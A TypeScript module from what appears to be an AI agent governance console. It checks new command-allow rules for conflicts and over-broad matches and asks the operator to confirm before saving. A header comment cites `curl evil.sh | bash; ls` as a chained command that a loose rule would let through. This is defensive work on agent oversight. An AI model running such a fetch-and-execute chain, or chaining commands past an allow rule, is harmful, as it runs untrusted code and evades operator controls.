// What a rule write reports, asked before the write and shown after it.
//
// **Before (QA of 2026-10-19, R1).** The "broader than it looks" warning and the clash
// notices used to come back only in the answer to the write, so an operator learned that
// `echo qa-usability` also allows `curl evil.sh | bash; ls` once the rule was in force for
// the agent. The form now asks the server first (`policy/rules` with `dryRun`, the same
// checks under the same authorization) and writes only after "Add anyway".
//
// **After (R3).** The notice names the rule it is about and goes when that rule is
// removed; it used to stay on screen about a rule that no longer existed.
import { showConfirmDialog } from "../../../components/confirm-dialog.ts";
import { t } from "../../../i18n/index.ts";
import type { AddRuleRequest, GovernanceRuleCheck } from "../api.policy-writes.ts";
import type {
  GovernanceApi,
  GovernancePolicyRule,
  GovernanceRuleConflict,
  GovernanceRuleCreation,
  GovernanceRuleWarning,
} from "../api.ts";

/** The rules one write produced, and the pattern the operator wrote. */
type RuleNoticeSubject = { ruleIds: readonly string[]; pattern: string };

export type ConflictNotice = RuleNoticeSubject & { conflicts: GovernanceRuleConflict[] };
export type WarningNotice = RuleNoticeSubject & { warnings: GovernanceRuleWarning[] };

/** What a policy write reported beyond success, for the page's notice band. */
export type RuleNotices = {
  conflictNotice: ConflictNotice | null;
  ruleWarnings: WarningNotice | null;
};

/** The notices for one write; an empty list is no notice. */
export function ruleNoticesFor(
  subject: RuleNoticeSubject,
  report: { conflicts?: GovernanceRuleConflict[]; warnings?: GovernanceRuleWarning[] },
): RuleNotices {
  const conflicts = report.conflicts ?? [];
  const warnings = report.warnings ?? [];
  return {
    conflictNotice: conflicts.length > 0 ? { ...subject, conflicts } : null,
    ruleWarnings: warnings.length > 0 ? { ...subject, warnings } : null,
  };
}

/** The notices left once `ruleId` is removed, or undefined when none was about it. */
export function noticesAfterRemoval(notices: RuleNotices, ruleId: string): RuleNotices | undefined {
  const about = (notice: RuleNoticeSubject | null) => notice?.ruleIds.includes(ruleId) === true;
  if (!about(notices.conflictNotice) && !about(notices.ruleWarnings)) {
    return undefined;
  }
  return {
    conflictNotice: about(notices.conflictNotice) ? null : notices.conflictNotice,
    ruleWarnings: about(notices.ruleWarnings) ? null : notices.ruleWarnings,
  };
}

/**
 * The notice a refresh leaves standing (finding 437).
 *
 * Removal through this tab's button was the only way a notice went, so a rule removed by
 * another operator, or one whose lifetime ran out, kept "broader than it looks" on screen
 * about a rule no longer in force. A refresh that no longer shows every rule the notice is
 * about in force retires it, as `noticesAfterRemoval` does for one rule.
 *
 * **Only the notice the refresh started with**, as `keptKillNotice` does: one raised while
 * the refresh was in the air is newer than the policy it read, which lacks the new rule.
 */
export function noticeInForce<T extends RuleNoticeSubject>(
  current: T | null,
  atRefreshStart: T | null,
  rules: readonly GovernancePolicyRule[],
  nowMs: number = Date.now(),
): T | null {
  if (current === null || current !== atRefreshStart) {
    return current;
  }
  const inForce = (id: string) =>
    rules.some(
      (rule) => rule.id === id && !(rule.expiresAt && Date.parse(rule.expiresAt) <= nowMs),
    );
  return current.ruleIds.every(inForce) ? current : null;
}

/** The check, said in the dialog: what the rule is, for whom, and each thing reported. */
function confirmReportedRule(
  rule: AddRuleRequest,
  check: GovernanceRuleCheck,
  agentLabel: (agentId: string) => string,
): Promise<boolean> {
  const scope = rule.agentId
    ? t("governance.policy.ruleCheckScopeAgent", { agent: agentLabel(rule.agentId) })
    : t("governance.policy.ruleCheckScopeAll");
  const effect = t(
    rule.effect === "deny" ? "governance.policy.effectDeny" : "governance.policy.effectAllow",
  );
  // Clashes first, as the request preview orders them: a clash says what the rule changes.
  const items = [
    ...check.conflicts.map((conflict) => `"${conflict.existingPattern}": ${conflict.message}`),
    ...check.warnings.map((warning) => warning.message),
  ];
  const lead = t("governance.policy.ruleCheckLead", { effect, scope });
  return showConfirmDialog({
    title: t("governance.policy.ruleCheckTitle"),
    message: [lead, ...items.map((item) => `• ${item}`)].join("\n\n"),
    details: `${rule.resourceKind} ${rule.pattern}`,
    confirmLabel: t("governance.policy.ruleCheckAddAnyway"),
    cancelLabel: t("governance.policy.ruleCheckChange"),
    danger: true,
  });
}

/**
 * Writes the rule once the operator has seen what it would report: at once when there is
 * nothing to report, after "Add anyway" otherwise. Null when they chose to change it.
 */
export async function addRuleAfterCheck(
  api: GovernanceApi,
  rule: AddRuleRequest,
  agentLabel: (agentId: string) => string,
): Promise<GovernanceRuleCreation | null> {
  const check = await api.checkRule(rule);
  const reported = check.conflicts.length > 0 || check.warnings.length > 0;
  if (reported && !(await confirmReportedRule(rule, check, agentLabel))) {
    return null;
  }
  return api.addRule(rule);
}
